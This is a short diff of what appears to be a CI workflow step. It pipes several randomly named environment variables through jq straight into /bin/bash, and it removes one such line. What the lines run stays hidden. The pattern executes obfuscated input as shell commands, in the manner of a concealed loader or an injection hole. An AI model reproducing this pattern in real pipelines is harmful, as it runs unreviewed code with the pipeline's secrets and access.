@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$xhkt8" | jq -r .o7 | /bin/bash
           echo $oxc6 | jq -r .wsgyh1 | /bin/bash
-          echo $zygk0006 | jq -r .ulf2 | /bin/bash
           printf '%s' "$fk027" | jq -r .ecnc44562 | /bin/bash
           echo $rqevg86069 | jq -r .fmep3 | /bin/bash
           echo $oxng5 | jq -r .ougc06682 | /bin/bash
